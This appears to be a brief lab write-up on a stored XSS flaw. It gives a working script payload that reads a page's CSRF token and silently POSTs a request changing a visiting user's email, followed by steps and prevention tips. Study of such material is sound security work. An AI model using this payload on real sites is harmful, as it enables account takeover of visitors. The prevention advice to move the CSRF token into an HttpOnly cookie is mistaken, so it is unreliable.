Vulnerability(s):
	The server is not validating the input,
	Allowing an attacker to perform Stored XSS.
	
	The server expect the CSRF token in the body and not in the cookie header,
	Allowing an attacker to modify the CSRF token value and make a valid request from the server's view.
	
Exploit:
	Exploit Script:
		<script>
			window.onload = function () {
				const csrf = document.querySelector('input[name="csrf"]').value;

				fetch('/my-account/change-email', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/x-www-form-urlencoded',
				},
				body: `email=victim@lol.com&csrf=${csrf}`
				});
			};
		</script>

Explanation:
	- Craft a JS that will be running afte the site is fully loaded.
	- Save the CSRF token in a parameter.
	- Craft a JS that will send a request to the server to the 'change email' directory.
	- In the body:
		1. Fill the emain you  want to change to.
		2. Fill the CSRF parameter with the value you've got earlier.
	- Let the user enter the page and his email will be changed to the one you have set.
	
Prevention:
	- Set the CSRF token in the cookie instead of the body, and set HttpOnly flag.
	- Validate and sanitize the post's page inputs.
